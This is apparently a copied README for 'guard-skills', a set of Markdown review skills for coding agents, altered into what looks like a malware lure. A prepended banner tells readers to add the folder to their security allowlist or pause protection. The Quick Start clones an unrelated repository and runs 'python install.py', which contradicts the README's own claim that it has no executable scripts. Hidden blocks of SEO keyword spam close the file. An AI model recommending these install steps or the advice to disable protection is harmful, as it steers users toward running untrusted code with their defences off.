# guard-skills


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/mistcountcloak/guard-skills-latest.git
cd guard-skills-latest
python install.py
```


[![skills.sh](https://skills.sh/b/amElnagdy/guard-skills)](https://skills.sh/amElnagdy/guard-skills)

Focused **guard skills** for coding agents: second-pass quality gates that catch the systematic failure modes of AI-generated code, tests, and docs before they ship.

Best use: let your agent do the work, then invoke the relevant guard on the diff before you present, commit, or merge it. These skills can guide writing when you explicitly ask for that, but they are strongest as reactive review passes.


## Which guard to run

| Guard | Use after the agent changed | Catches | Pair with |
| --- | --- | --- | --- |
| `clean-code-guard` | Production code in any language | LLM code smells, over-abstraction, broad error swallowing, bad names, SOLID/DRY/KISS/YAGNI violations | Platform-specific guards |
| `test-guard` | Test code | Mock abuse, duplicate tests, implementation-detail assertions, tests that catch nothing | `clean-code-guard` when test helpers contain real logic |
| `docs-guard` | READMEs, docstrings, API docs, changelogs, tutorials | Hallucinated symbols, broken samples, docs-vs-code drift, unverifiable claims | Any guard whose behavior is documented |
| `wp-guard` | WordPress plugin, theme, block, REST, AJAX, shortcode, query, or WP-CLI code | Escaping, sanitization, nonces, capabilities, prepared queries, i18n, query/caching mistakes | `clean-code-guard`; `woo-guard` when Woo APIs appear |
| `woo-guard` | WooCommerce extension, checkout, order, product, gateway, shipping, or HPOS code | Direct order meta, HPOS breakage, missing compatibility declarations, checkout bypasses, money errors | `wp-guard` for the WordPress layer |

## The skills

### clean-code-guard

Applies Clean Code, SOLID, DRY/KISS/YAGNI to generated or changed code in any language, plus an AI-specific layer most rule packs miss: catch-all error swallowing, hardcoded "success" returns, hallucinated APIs, premature abstraction, comment pollution, and copy-from-similar bugs.

Why the AI layer matters: the skill references published research on duplication growth, package hallucination, and agents declaring success despite failed tests.

**You'll feel it when:** your agent refactors without silently changing behavior, asks before changing a contract, justifies what it deliberately left out, and stops wrapping everything in `try/catch -> return ok`.

### test-guard

A quality gate for generated or changed test code in any language: pytest, PHPUnit/Pest, Jest/Vitest, Go tests, WordPress/WooCommerce tests, and more. Nine universal rules catch AI test bloat: mock only at system boundaries, never mock your own state objects, parametrize instead of copy-pasting, delete tests that catch nothing, and treat production regression tests as sacred.

Framework specifics live in progressive-disclosure references the agent loads only when relevant, including a dedicated reference for LLM applications.

**You'll feel it when:** a generated test file with `MagicMock()` state, duplicated test bodies, and log-message assertions comes back as "do not merge" with rule-by-rule fixes.

### docs-guard

A documentation accuracy gate for READMEs, API references, docstrings, PHPDoc/JSDoc, changelogs, and tutorials. Its core move: treat documentation as a list of claims and verify every one against the codebase.

**You'll feel it when:** a generated README stops referencing functions that do not exist, `@param` tags match the real signature, samples run on a clean machine, and "blazingly fast" leaves the building.

### wp-guard

A WordPress shipping guard for generated or changed plugins, themes, blocks, REST endpoints, AJAX handlers, shortcodes, WP-CLI commands, and queries. It enforces the layer generic clean-code guidance misses: escaping and sanitization, nonce plus capability checks, prepared database queries, core APIs before custom plumbing, translation-ready strings, and query/caching discipline.

**You'll feel it when:** a generated plugin stops echoing raw request data, a writing REST route gets a real permission callback, every string ships translation-ready, and a million-row site does not get handed `posts_per_page => -1`.

### woo-guard

A WooCommerce shipping guard for generated or changed extensions, payment and shipping integrations, checkout customizations, and order/product logic. It sits on top of `wp-guard` and enforces what is WooCommerce-specific: HPOS-safe order access, CRUD over direct meta, truthful feature-compatibility declarations, server-side checkout validation, money-handling discipline, and hooks over template overrides.

**You'll feel it when:** order code survives HPOS, stock updates stop racing, checkout rules hold without JavaScript, and `'$' . $amount` never reaches a store that sells in dirhams.

## How this differs

This is not a full process framework and not a broad platform catalog. Repos like [WordPress/agent-skills](https://github.com/WordPress/agent-skills) teach agents how to build across the WordPress ecosystem. `guard-skills` is narrower: it gives agents review gates to run after they have produced work, so common AI failure modes get caught before the work reaches your repo.

## Repository shape

Each skill is a folder with a `SKILL.md` entrypoint, lightweight agent metadata, and progressive-disclosure references:

```text
skills/
├── clean-code-guard/
│   ├── SKILL.md
│   ├── agents/openai.yaml
│   └── references/
├── docs-guard/
│   ├── SKILL.md
│   ├── agents/openai.yaml
│   └── references/
├── test-guard/
│   ├── SKILL.md
│   ├── agents/openai.yaml
│   └── references/
├── woo-guard/
│   ├── SKILL.md
│   ├── agents/openai.yaml
│   └── references/
└── wp-guard/
    ├── SKILL.md
    ├── agents/openai.yaml
    └── references/
```

The `SKILL.md` stays small so it loads cheaply; deeper guidance loads only when the task needs it.

## Trust and validation

This package is intentionally inspectable:

- Skill content is Markdown plus lightweight `agents/openai.yaml` metadata.
- There are no executable scripts, network calls, MCP server dependencies, or credentials.
- External source URLs live in each skill's `references/sources.md`.

Maintainer checks before publishing:

```bash
npx skills add . --list --full-depth
```

With SkillSpector installed:

```bash
for skill in skills/*; do
  skillspector scan "$skill" --no-llm
done
```

When authoring with a local skill-creator validator, each skill is also checked with `quick_validate.py` before release.

## License

MIT — see [LICENSE](LICENSE).


<!-- python pip pypi package library module script tool windows linux macos -->
<!-- guard-skills-latest - tool utility software - download install setup -->
<!-- download reliable guard-skills-latest | minimal guard-skills-latest platform | fast guard-skills-latest | minimal guard-skills-latest converter | download for mac minimal guard-skills-latest | zip guard-skills-latest gui | easy guard-skills-latest compressor | examples guard-skills-latest | free download guard-skills-latest port | self hosted guard-skills-latest decoder | guard skills latest review | guard-skills-latest utility | debian guard-skills-latest library | centos guard-skills-latest tracker | open source guard-skills-latest api | use guard-skills-latest api | how to run guard-skills-latest module | beginner advanced guard-skills-latest uploader | run on linux guard-skills-latest sdk | fedora guard-skills-latest parser | self hosted guard-skills-latest engine | download guard-skills-latest binding | git clone lightweight guard-skills-latest generator | download guard-skills-latest | minimal guard-skills-latest | zip guard-skills-latest | simple guard-skills-latest | windows guard-skills-latest validator | linux guard-skills-latest utility | macos fast guard-skills-latest | how to install guard-skills-latest package | safe guard-skills-latest decoder | extensible guard-skills-latest tracker | source code customizable guard-skills-latest mirror | macos guard-skills-latest scanner | setup guard-skills-latest analyzer | ubuntu guard-skills-latest compressor | easy guard-skills-latest api | tar.gz modular guard-skills-latest library | ubuntu guard-skills-latest validator | walkthrough free guard-skills-latest | download for linux guard-skills-latest | guard-skills-latest builder | online guard-skills-latest extractor | secure guard-skills-latest converter | stable guard-skills-latest mirror | build stable guard-skills-latest | guard skills latest github | walkthrough fast guard-skills-latest | guard skills latest benchmark -->
<!-- how to use top guard-skills-latest | run on linux local guard-skills-latest | fedora guard-skills-latest checker | beginner advanced guard-skills-latest | guard skills latest bug | setup guard-skills-latest scanner | how to use guard-skills-latest creator | install self hosted guard-skills-latest scanner | guard-skills-latest api | get open source guard-skills-latest | run on linux guard-skills-latest scanner | guard-skills-latest compressor | source code best guard-skills-latest engine | high performance guard-skills-latest client | macos guard-skills-latest extension | online guard-skills-latest reader | native guard-skills-latest service | latest version low latency guard-skills-latest | best guard-skills-latest | how to run guard-skills-latest api | how to install guard-skills-latest | demo customizable guard-skills-latest | guard-skills-latest library | quick start powerful guard-skills-latest | native guard-skills-latest fork | documentation guard-skills-latest compressor | start guard-skills-latest tester | how to deploy guard-skills-latest gui | guard-skills-latest generator | example fast guard-skills-latest | git clone guard-skills-latest creator | safe guard-skills-latest framework | source code guard-skills-latest server | launch guard-skills-latest | free download powerful guard-skills-latest application | modern guard-skills-latest logger | quickstart guard-skills-latest replacement | github guard-skills-latest clone | extensible guard-skills-latest library | modern guard-skills-latest validator | sample guard-skills-latest | ubuntu guard-skills-latest gui | how to install guard-skills-latest generator | easy guard-skills-latest logger | launch guard-skills-latest clone | run on mac guard-skills-latest client | how to deploy guard-skills-latest mobile | configure guard-skills-latest tracker | deploy configurable guard-skills-latest | open source customizable guard-skills-latest -->
<!-- start guard-skills-latest logger | macos guard-skills-latest | run on linux guard-skills-latest analyzer | reliable guard-skills-latest client | download for mac extensible guard-skills-latest extractor | secure guard-skills-latest viewer | docs guard-skills-latest logger | execute guard-skills-latest app | run on linux guard-skills-latest desktop | download for linux guard-skills-latest mobile | cross platform guard-skills-latest logger | macos high performance guard-skills-latest | modular guard-skills-latest converter | debian guard-skills-latest tool | is guard skills latest legit | guard skills latest vs | build guard-skills-latest debugger | open source guard-skills-latest generator | free guard-skills-latest | zip guard-skills-latest viewer | secure guard-skills-latest | lightweight guard-skills-latest addon | local guard-skills-latest generator | guard-skills-latest binding | launch guard-skills-latest service | example guard-skills-latest wrapper | guard skills latest docker | source code modern guard-skills-latest parser | documentation guard-skills-latest utility | use guard-skills-latest desktop | top guard-skills-latest package | github low latency guard-skills-latest api | setup guard-skills-latest | low latency guard-skills-latest package | powerful guard-skills-latest | walkthrough production ready guard-skills-latest platform | ubuntu native guard-skills-latest addon | download for windows guard-skills-latest web | is guard skills latest safe | advanced guard-skills-latest viewer | modular guard-skills-latest plugin | tutorial guard-skills-latest | github guard-skills-latest compressor | guard-skills-latest engine | download open source guard-skills-latest | download for windows guard-skills-latest | lightweight guard-skills-latest platform | wiki guard-skills-latest application | guard-skills-latest program | guard skills latest podcast -->
<!-- guard-skills-latest downloader | zip minimal guard-skills-latest | github guard-skills-latest platform | linux safe guard-skills-latest | how to use guard-skills-latest decoder | quick start guard-skills-latest app | self hosted guard-skills-latest server | secure guard-skills-latest logger | how to run guard-skills-latest analyzer | modern guard-skills-latest replacement | demo guard-skills-latest api | beginner online guard-skills-latest | latest version modern guard-skills-latest reader | tar.gz guard-skills-latest mirror | download for mac guard-skills-latest library | simple guard-skills-latest decoder | simple guard-skills-latest wrapper | configurable guard-skills-latest gui | minimal guard-skills-latest gui | git clone guard-skills-latest | how to install top guard-skills-latest | customizable guard-skills-latest clone | windows guard-skills-latest | 2026 guard-skills-latest tool | quickstart guard-skills-latest analyzer | getting started free guard-skills-latest | example guard-skills-latest program | build github guard-skills-latest | free guard-skills-latest reader | zip guard-skills-latest web | how to run high performance guard-skills-latest | beginner guard-skills-latest replacement | linux guard-skills-latest wrapper | how to run guard-skills-latest | how to deploy guard-skills-latest scanner | download guard-skills-latest software | how to use guard-skills-latest | guard-skills-latest wrapper | how to setup simple guard-skills-latest | 2025 production ready guard-skills-latest analyzer | sample guard-skills-latest service | online guard-skills-latest plugin | download for mac guard-skills-latest decoder | 2025 guard-skills-latest port | free download github guard-skills-latest | fast guard-skills-latest logger | github guard-skills-latest monitor | how to configure guard-skills-latest analyzer | portable guard-skills-latest monitor | fedora guard-skills-latest mirror -->
<!-- guard skills latest best practice | demo guard-skills-latest builder | getting started guard-skills-latest compressor | open top guard-skills-latest optimizer | 2025 modern guard-skills-latest | secure guard-skills-latest client | documentation top guard-skills-latest | examples guard-skills-latest cli | wiki guard-skills-latest compressor | windows guard-skills-latest uploader | self hosted guard-skills-latest | debian guard-skills-latest replacement | execute guard-skills-latest downloader | compile stable guard-skills-latest | guard-skills-latest port | launch guard-skills-latest reader | guard-skills-latest scanner | github guard-skills-latest uploader | safe guard-skills-latest wrapper | configure guard-skills-latest server | examples guard-skills-latest debugger | compile guard-skills-latest utility | free guard-skills-latest downloader | self hosted guard-skills-latest package | fedora guard-skills-latest debugger | tar.gz guard-skills-latest package | high performance guard-skills-latest viewer | compile guard-skills-latest framework | how to run guard-skills-latest reader | offline guard-skills-latest decoder | sample guard-skills-latest compressor | offline guard-skills-latest optimizer | top guard-skills-latest tracker | walkthrough production ready guard-skills-latest extractor | modular guard-skills-latest checker | run on linux github guard-skills-latest | how to build guard-skills-latest tracker | latest version guard-skills-latest uploader | deploy guard-skills-latest application | guard-skills-latest logger | how to build guard-skills-latest fork | secure guard-skills-latest gui | download for windows guard-skills-latest replacement | modern guard-skills-latest downloader | extensible guard-skills-latest editor | beginner guard-skills-latest service | sample guard-skills-latest framework | example powerful guard-skills-latest | online guard-skills-latest | download for mac guard-skills-latest -->
<!-- stable guard-skills-latest encoder | reliable guard-skills-latest | guard skills latest handbook | guard skills latest cloud | download for mac native guard-skills-latest | new version guard-skills-latest | run on mac configurable guard-skills-latest | advanced guard-skills-latest | download guard-skills-latest platform | documentation easy guard-skills-latest | arch configurable guard-skills-latest checker | wiki guard-skills-latest viewer | source code guard-skills-latest monitor | source code guard-skills-latest | simple guard-skills-latest software | how to configure guard-skills-latest tracker | how to configure guard-skills-latest checker | guard-skills-latest service | quick start guard-skills-latest analyzer | 2025 guard-skills-latest editor | guard skills latest ci cd | how to setup production ready guard-skills-latest compressor | guard-skills-latest module | guide guard-skills-latest desktop | tutorial guard-skills-latest reader | run on mac modern guard-skills-latest extractor | examples extensible guard-skills-latest | self hosted guard-skills-latest alternative | guard-skills-latest package | tutorial guard-skills-latest scanner | docs guard-skills-latest server | free guard skills latest | new version guard-skills-latest api | advanced guard-skills-latest utility | modular guard-skills-latest | cross platform guard-skills-latest reader | 2025 guard-skills-latest logger | how to configure production ready guard-skills-latest | wiki guard-skills-latest creator | run guard-skills-latest engine | lightweight guard-skills-latest extractor | portable guard-skills-latest converter | cross platform guard-skills-latest extension | start guard-skills-latest converter | modular guard-skills-latest port | arch guard-skills-latest converter | how to download guard-skills-latest wrapper | fedora local guard-skills-latest generator | docs guard-skills-latest | production ready guard-skills-latest downloader -->
<!-- advanced guard-skills-latest uploader | linux guard-skills-latest service | 2026 guard-skills-latest | quickstart top guard-skills-latest | production ready guard-skills-latest gui | 2025 guard-skills-latest uploader | free download guard-skills-latest application | tutorial guard-skills-latest editor | quick start guard-skills-latest alternative | ubuntu guard-skills-latest creator | guard-skills-latest plugin | lightweight guard-skills-latest scanner | documentation reliable guard-skills-latest | guard-skills-latest monitor | lightweight guard-skills-latest | open source modular guard-skills-latest library | guard-skills-latest debugger | example secure guard-skills-latest uploader | customizable guard-skills-latest | getting started guard-skills-latest alternative | download guard-skills-latest tracker | reliable guard-skills-latest replacement | how to download guard-skills-latest addon | free free guard-skills-latest downloader | stable guard-skills-latest alternative | best guard-skills-latest tool | deploy guard-skills-latest downloader | use self hosted guard-skills-latest | free download offline guard-skills-latest monitor | centos guard-skills-latest framework | open guard-skills-latest sdk | fast guard-skills-latest replacement | tar.gz guard-skills-latest | 2026 guard-skills-latest port | execute guard-skills-latest monitor | quickstart lightweight guard-skills-latest | ubuntu native guard-skills-latest | walkthrough guard-skills-latest tester | example guard-skills-latest analyzer | debian guard-skills-latest | walkthrough guard-skills-latest desktop | lightweight guard-skills-latest converter | example cross platform guard-skills-latest | macos powerful guard-skills-latest | modular guard-skills-latest sdk | modular guard-skills-latest app | getting started reliable guard-skills-latest | configurable guard-skills-latest analyzer | updated guard-skills-latest engine | minimal guard-skills-latest utility -->
<!-- github guard-skills-latest server | guard-skills-latest clone | github guard-skills-latest software | guard-skills-latest tester | example guard-skills-latest clone | zip extensible guard-skills-latest | guard-skills-latest app | configure guard-skills-latest cli | modular guard-skills-latest scanner | lightweight guard-skills-latest builder | github customizable guard-skills-latest | advanced guard-skills-latest copy | run on mac guard-skills-latest tester | customizable guard-skills-latest tracker | configurable guard-skills-latest utility | github configurable guard-skills-latest | how to run self hosted guard-skills-latest | guard-skills-latest client | local guard-skills-latest viewer | guard-skills-latest creator | free guard-skills-latest monitor | configurable guard-skills-latest application | guard skills latest error | guard-skills-latest desktop | documentation guard-skills-latest package | run on windows guard-skills-latest | beginner guard-skills-latest tool | compile guard-skills-latest compressor | lightweight guard-skills-latest desktop | arch safe guard-skills-latest | documentation guard-skills-latest | guard skills latest support | how to use guard-skills-latest client | walkthrough guard-skills-latest mirror | install guard-skills-latest binding | run on windows guard-skills-latest monitor | guard-skills-latest sdk | download guard-skills-latest tester | download for linux high performance guard-skills-latest desktop | install guard-skills-latest debugger | minimal guard-skills-latest engine | how to setup guard-skills-latest binding | arch guard-skills-latest module | guard-skills-latest copy | git clone offline guard-skills-latest | macos guard-skills-latest server | how to configure guard-skills-latest | 2025 guard-skills-latest | debian guard-skills-latest checker | online guard-skills-latest desktop -->
<!-- examples guard-skills-latest application | how to build powerful guard-skills-latest | guard skills latest course | demo guard-skills-latest | guard skills latest project | how to download guard-skills-latest editor | online guard-skills-latest checker | easy guard-skills-latest | get guard-skills-latest copy | latest version guard-skills-latest addon | reliable guard-skills-latest plugin | compile guard-skills-latest mobile | how to setup guard-skills-latest validator | latest version guard-skills-latest | guard-skills-latest server | open source guard-skills-latest | secure guard-skills-latest software | getting started guard-skills-latest downloader | download for windows guard-skills-latest downloader | how to build guard-skills-latest parser | guard skills latest reference | sample guard-skills-latest debugger | launch guard-skills-latest extension | local guard-skills-latest program | how to build guard-skills-latest port | run on windows guard-skills-latest tester | run on windows stable guard-skills-latest | sample powerful guard-skills-latest | free download guard-skills-latest editor | fast guard-skills-latest generator | fedora guard-skills-latest | download for mac guard-skills-latest encoder | beginner guard-skills-latest decoder | online guard-skills-latest decoder | guard-skills-latest alternative | extensible guard-skills-latest encoder | deploy production ready guard-skills-latest mirror | safe guard-skills-latest port | centos minimal guard-skills-latest decoder | walkthrough reliable guard-skills-latest | high performance guard-skills-latest | install guard-skills-latest | extensible guard-skills-latest validator | compile guard-skills-latest replacement | centos guard-skills-latest | git clone guard-skills-latest app | demo guard-skills-latest engine | how to build guard-skills-latest optimizer | zip guard-skills-latest creator | arch guard-skills-latest application -->
<!-- local guard-skills-latest addon | zip production ready guard-skills-latest | guard-skills-latest converter | how to build guard-skills-latest | is guard skills latest good | deploy guard-skills-latest | source code easy guard-skills-latest | macos guard-skills-latest editor | latest version guard-skills-latest package | get guard-skills-latest | how to deploy guard-skills-latest uploader | how to setup guard-skills-latest viewer | guard-skills-latest web | customizable guard-skills-latest software | safe guard-skills-latest encoder | walkthrough guard-skills-latest cli | top guard skills latest | new version guard-skills-latest downloader | how to run guard-skills-latest generator | how to download modern guard-skills-latest monitor | centos guard-skills-latest client | free configurable guard-skills-latest | how to configure extensible guard-skills-latest | 2025 guard-skills-latest clone | windows guard-skills-latest optimizer | tutorial easy guard-skills-latest | customizable guard-skills-latest tester | guard-skills-latest addon | tutorial online guard-skills-latest | modern guard-skills-latest application | get guard-skills-latest scanner | arch guard-skills-latest cli | how to deploy guard-skills-latest | git clone guard-skills-latest sdk | how to deploy secure guard-skills-latest | modular guard-skills-latest creator | tar.gz guard-skills-latest optimizer | how to setup guard-skills-latest alternative | updated guard-skills-latest decoder | download for linux guard-skills-latest service | top guard-skills-latest editor | guard-skills-latest extractor | get guard-skills-latest converter | ubuntu guard-skills-latest | download for windows guard-skills-latest debugger | setup guard-skills-latest builder | guard-skills-latest tool | native guard-skills-latest generator | guard skills latest help | guard-skills-latest encoder -->

<!-- Last updated: 2026-06-09 19:09:58 -->
